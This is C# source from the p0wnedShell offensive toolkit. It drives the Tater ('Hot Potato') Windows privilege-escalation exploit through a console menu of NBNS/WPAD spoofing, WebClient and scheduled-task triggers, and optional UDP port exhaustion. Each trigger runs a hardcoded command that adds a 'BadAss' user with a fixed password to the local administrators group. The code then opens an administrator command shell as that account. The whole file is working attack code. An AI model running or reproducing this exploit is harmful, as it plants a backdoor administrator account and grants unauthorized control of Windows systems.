using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Security;
using System.Diagnostics;

namespace p0wnedShell
{
    class SecurePass
    {
        SecureString securePwd = new SecureString();

        public SecureString convertToSecureString(string strPassword)
        {
            var secureStr = new SecureString();
            if (strPassword.Length > 0)
            {
                foreach (var c in strPassword.ToCharArray()) secureStr.AppendChar(c);
            }
            return secureStr;
        }
    }

    class Potato
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Tater \"The Posh Hot Potato\" Windows Privilege Escalation exploit. *",
                                 "* Based on the original Hot Potato Code by FoxGlove Security.       *" };
 //           Program.PrintBanner(toPrint);
        }

        public static void TaterMenu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Trigger 0 -> No automatic trigger, just wait... (or in case of W2k8 -> search for Windows Updates).");
            Console.WriteLine();
            Console.WriteLine(" 2. Trigger 1 -> NBNS WPAD Bruteforce + Windows Defender Signature Updates (Currently works on Windows 7).");
            Console.WriteLine();
            Console.WriteLine(" 3. Trigger 2 -> WebClient Service + Scheduled Task (Currently works on Windows 10).");
            Console.WriteLine();
            Console.WriteLine(" 4. Setup a Remote WPAD Proxy in case Port 80 is in use on target system.");
            Console.WriteLine();
            Console.WriteLine(" 5. Get-Tater will display queued Tater output.");
            Console.WriteLine();
            Console.WriteLine(" 6. Stop-Tater will stop Tater before a successful privilege escalation.");
            Console.WriteLine();
            Console.WriteLine(" 7. Back.");
            Console.Write("\nEnter choice: ");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 7)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    Trigger0();
                    break;
                case 2:
                    Trigger1();
                    break;
                case 3:
                    Trigger2();
                    break;
                case 4:
                    WPADProxy();
                    break;
                case 5:
                    GetTater();
                    break;
                case 6:
                    StopTater();
                    break;
                default:
                    break;
            }
        }

        public static string TaterCommand()
        {
            string Command = "\"net user BadAss FacePalm01 /add && net localgroup administrators BadAss /add\"";
            return Command;
         }

        public static bool PortInUse(int port)
        {
            bool inUse = false;

            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] ipEndPoints = ipProperties.GetActiveTcpListeners();

            foreach (IPEndPoint endPoint in ipEndPoints)
            {
                if (endPoint.Port == port)
                {
                    inUse = true;
                    break;
                }
            }

            return inUse;
        }

        public static void Finished()
        {
            SecurePass SecurePassObj = new SecurePass();

            Process PoPShell = new Process
            {
                StartInfo =
                {
                    CreateNoWindow = false,
                    UseShellExecute = false,
                    WorkingDirectory = Environment.ExpandEnvironmentVariables(@"%SystemRoot%\System32"),
                    FileName = "cmd.exe",
                    UserName = "BadAss",
                    Password = SecurePassObj.convertToSecureString("FacePalm01"),
                }
            };
            PoPShell.Start();
        }

        public static void Trigger0()
        {
            string[] toPrint = { "* Trigger 0 -> No automatic trigger, just wait...                   *" };
//            Program.PrintBanner(toPrint);

            IPAddress SpoofIP = IPAddress.Parse("1.1.1.1");
            int Lport = 80;

            if (PortInUse(Lport))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Port " + Lport + " is already in use, so you need to setup a remote WPAD Proxy.");
                Console.WriteLine("[!] After running the remote WPAD Proxy, come back and enter the new Spoofed WPAD IP and HTTP Listener Port.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                while (true)
                {
                    try
                    {
                        Console.Write("Enter the IP address of the remote WPAD Proxy (e.g. 192.168.1.1): ");
                        Console.ForegroundColor = ConsoleColor.Green;
                        SpoofIP = IPAddress.Parse(Console.ReadLine());
                        Console.ResetColor();
                        Console.WriteLine();
                        break;
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
                        Console.ResetColor();
                    }
                }

                while (true)
                {
                    try
                    {
                        Console.Write("Now enter the listening port of the Tater HTTP Listener (e.g. 81 or 8080): ");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Lport = int.Parse(Console.ReadLine());
                        Console.ResetColor();
                        Console.WriteLine();

                        if (Lport < 1 || Lport > 65535)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                            Console.ResetColor();
                        }
                        else
                        {
                            break;
                        }
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                }
            }

            string WpadHost = "WPAD";
            Console.Write("Default WPAD entry to spoof is: {0}, do you want to use this?  (y/n) > ", WpadHost);

            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    break;
                case "n":
                    Console.Write("\nEnter WPAD host entry to spoof (e.g. WPAD.YOURDOMAIN.LOCAL): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    WpadHost = Console.ReadLine();
                    Console.ResetColor();
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }
            string Exhaust = "N";
            Console.Write("\nEnable UDP port exhaustion to force all DNS lookups to fail (Be Cautious)?  (y/n) > ");

            input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Exhaust = "Y";
                    break;
                case "n":
                    Exhaust = "N";
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }

            string Trigger_0 = null;

            if (PortInUse(80))
            {
                Trigger_0 = "Invoke-Tater -Trigger 0 -Command " + TaterCommand() + " -SpooferIP " + SpoofIP + " -HTTPPort " + Lport + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
            }
            else
            {
                Trigger_0 = "Invoke-Tater -Trigger 0 -Command " + TaterCommand() + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("\n[+] Now please wait while running our exploit\n\n");
            Console.ResetColor();

            try
            {
                P0wnedListener.Execute(Trigger_0);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            string Admin = "net localgroup administrators";
            string AdminPower = null;
            try
            {
                AdminPower = Pshell.RunPSCommand(Admin);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (AdminPower.IndexOf("BadAss", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[!] You should now be able to login as user \"BadAss\" with passwd \"FacePalm01\"");
                Console.WriteLine("[!] To make life easier, it should also PopUp a CommandShell with Local Administrator privileges :)\n");
                Console.ResetColor();
                Finished();
            }

            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void Trigger1()
        {
            string[] toPrint = { "* Trigger 1 -> NBNS WPAD Bruteforce + Defender Signature Updates    *" };
 //           Program.PrintBanner(toPrint);

            IPAddress SpoofIP = IPAddress.Parse("1.1.1.1");
            int Lport = 80;

            if (PortInUse(Lport))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Port " + Lport + " is already in use, so you need to setup a remote WPAD Proxy.");
                Console.WriteLine("[!] After running the remote WPAD Proxy, come back and enter the new Spoofed WPAD IP and HTTP Listener Port.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                while (true)
                {
                    try
                    {
                        Console.Write("Enter the IP address of the remote WPAD Proxy (e.g. 192.168.1.1): ");
                        Console.ForegroundColor = ConsoleColor.Green;
                        SpoofIP = IPAddress.Parse(Console.ReadLine());
                        Console.ResetColor();
                        Console.WriteLine();
                        break;
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
                        Console.ResetColor();
                    }
                }

                while (true)
                {
                    try
                    {
                        Console.Write("Now enter the listening port of the Tater HTTP Listener (e.g. 81 or 8080): ");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Lport = int.Parse(Console.ReadLine());
                        Console.ResetColor();
                        Console.WriteLine();

                        if (Lport < 1 || Lport > 65535)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                            Console.ResetColor();
                        }
                        else
                        {
                            break;
                        }
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                }
            }

            string WpadHost = "WPAD";
            Console.Write("Default WPAD entry to spoof is: {0}, do you want to use this?  (y/n) > ", WpadHost);

            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    break;
                case "n":
                    Console.Write("\nEnter WPAD host entry to spoof (e.g. WPAD.YOURDOMAIN.LOCAL): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    WpadHost = Console.ReadLine();
                    Console.ResetColor();
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }
            string Exhaust = "N";
            Console.Write("\nEnable UDP port exhaustion to force all DNS lookups to fail (Be Cautious)?  (y/n) > ");

            input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Exhaust = "Y";
                    break;
                case "n":
                    Exhaust = "N";
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }

            string Trigger_1 = null;

            if (PortInUse(80))
            {
                Trigger_1 = "Invoke-Tater -Command " + TaterCommand() + " -SpooferIP " + SpoofIP + " -HTTPPort " + Lport + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
            }
            else
            {
                Trigger_1 = "Invoke-Tater -Command " + TaterCommand() + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("\n[+] Now please wait while running our exploit\n\n");
            Console.ResetColor();

            try
            {
                P0wnedListener.Execute(Trigger_1);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            string Admin = "net localgroup administrators";
            string AdminPower = null;
            try
            {
                AdminPower = Pshell.RunPSCommand(Admin);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (AdminPower.IndexOf("BadAss", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[!] You should now be able to login as user \"BadAss\" with passwd \"FacePalm01\"");
                Console.WriteLine("[!] To make life easier, it should also PopUp a CommandShell with Local Administrator privileges :)\n");
                Console.ResetColor();
                Finished();
            }

            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void Trigger2()
        {
            string[] toPrint = { "* WebClient Service + Scheduled Task Trigger (Works on Windows 10). *",
                                 "*                                                                   *" };
//            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[+] Please wait while running our exploit\n\n");
            Console.ResetColor();

            string Trigger_2 = "Invoke-Tater -Command "+ TaterCommand() + "-Trigger 2 -ShowHelp N";
            try
            {
                P0wnedListener.Execute(Trigger_2);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            string Admin = "net localgroup administrators";
            string AdminPower = null;
            try
            {
                AdminPower = Pshell.RunPSCommand(Admin);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (AdminPower.IndexOf("BadAss", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[!] You should now be able to login as user \"BadAss\" with passwd \"FacePalm01\"");
                Console.WriteLine("[!] To make life easier, it should also PopUp a CommandShell with Local Administrator privileges :)\n");
                Console.ResetColor();
                Finished();
            }

            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void WPADProxy()
        {
            string[] toPrint = { "* Setup a Remote WPAD Proxy in case Port 80 is in use on target.    *" };
 //           Program.PrintBanner(toPrint);

            int Lport = 0;

            while (true)
            {
                try
                {
                    Console.Write("Enter the listening port of the Tater HTTP Listener on your target (e.g. 81 or 8080): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Lport = int.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            string WPAD_Proxy = "Invoke-Tater -Trigger 0 -NBNS N -Command \"whoami\" -WPADPort "+Lport+ " -ShowHelp N";
            try
            {
                P0wnedListener.Execute(WPAD_Proxy);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void GetTater()
        {
            string[] toPrint = { "* Get-Tater will display queued Tater output.                       *" };
 //           Program.PrintBanner(toPrint);

            string Get_Tater = "Get-Tater";
            try
            {
                P0wnedListener.Execute(Get_Tater);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void StopTater()
        {
            string[] toPrint = { "* Stop Tater before a successful privilege escalation.              *" };
 //           Program.PrintBanner(toPrint);

            Console.Write("[+] Please wait while stopping Tater (if running)...\n");

            string Stop_Tater = "Stop-Tater";
            try
            {
                P0wnedListener.Execute(Stop_Tater);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

    }
}